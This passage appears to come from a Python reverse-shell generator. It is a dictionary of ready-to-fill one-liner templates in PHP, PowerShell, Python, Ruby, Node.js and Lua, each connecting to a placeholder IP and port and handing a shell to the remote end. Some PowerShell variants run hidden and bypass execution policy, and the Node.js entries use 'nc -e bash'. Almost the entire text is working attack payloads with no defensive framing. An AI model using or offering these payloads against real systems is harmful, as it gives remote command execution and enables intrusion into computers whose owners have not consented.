...
?> \n """,
'php' : f""" php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);exec({chr(34)}bash <&3 >&3 2>&3{chr(34)});' \n php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);shell_exec({chr(34)}bash <&3 >&3 2>&3{chr(34)});' \n php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);system({chr(34)}bash <&3 >&3 2>&3{chr(34)});' \n  php -r '$sock=fsockopen({chr(34)}<ip>{chr(34)},<port>);`bash <&3 >&3 2>&3`;' \n """,
'powershell' : f""" powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient({chr(34)}<ip>{chr(34)},<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{chr(123)}{chr(125)}0{chr(125)};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){chr(123)}{chr(125)};$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + {chr(34)}PS {chr(34)} + (pwd).Path + {chr(34)}> {chr(34)};$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush(){chr(125)};$client.Close() \n powershell -nop -c {chr(34)}$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{chr(123)}{chr(125)}0{chr(125)};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){chr(123)}{chr(125)};$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush(){chr(125)};$client.Close(){chr(34)} \n powershell -nop -W hidden -noni -ep bypass -c {chr(34)}$TCPClient = New-Object Net.Sockets.TCPClient('<ip>', <port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {chr(123)}{chr(125)}[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {chr(123)}{chr(125)}0{chr(125)};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush(){chr(125)}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {chr(123)}{chr(125)}$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {chr(123)}{chr(125)}Invoke-Expression $Command 2>&1 | Out-String{chr(125)} catch {chr(123)}{chr(125)}$_ | Out-String{chr(125)}WriteToStream ($Output){chr(125)}$StreamWriter.Close(){chr(34)} \n """,
'python' : f""" export RHOST={chr(34)}<ip>{chr(34)};export RPORT=<port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv({chr(34)}RHOST{chr(34)}),int(os.getenv({chr(34)}RPORT{chr(34)}))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn({chr(34)}bash{chr(34)})' \n python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({chr(34)}<ip>{chr(34)},<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn({chr(34)}bash{chr(34)})' \n """,
'python3' : f""" export RHOST={chr(34)}<ip>{chr(34)};export RPORT=<port>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv({chr(34)}RHOST{chr(34)}),int(os.getenv({chr(34)}RPORT{chr(34)}))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn({chr(34)}bash{chr(34)})' \n python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({chr(34)}<ip>{chr(34)},<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn({chr(34)}bash{chr(34)})' \n python3 -c 'import os,pty,socket;s=socket.socket();s.connect(({chr(34)}<ip>{chr(34)},<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn({chr(34)}bash{chr(34)})' \n """,
'ruby' : f""" ruby -rsocket -e'spawn({chr(34)}sh{chr(34)},[:in,:out,:err]=>TCPSocket.new({chr(34)}<ip>{chr(34)},<port>))' \n """,
'nodejs' : f""" require('child_process').exec('nc -e bash <ip> <port>') \n require('child_process').exec('nc -e bash <ip> <port>') \n """,
...
'lua' : f""" lua -e {chr(34)}require('socket');require('os');t=socket.tcp();t:connect('<ip>','<port>');os.execute('bash -i <&3 >&3 2>&3');{chr(34)} \n lua5.1 -e 'local host, port = {chr(34)}<ip>{chr(34)}, <port> local socket = require({chr(34)}socket{chr(34)}) local tcp = socket.tcp() local io = require({chr(34)}io{chr(34)}) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, {chr(34)}r{chr(34)}) local s = f:read({chr(34)}*a{chr(34)}) f:close() tcp:send(s) if status == {chr(34)}closed{chr(34)} then break end end tcp:close()' """,
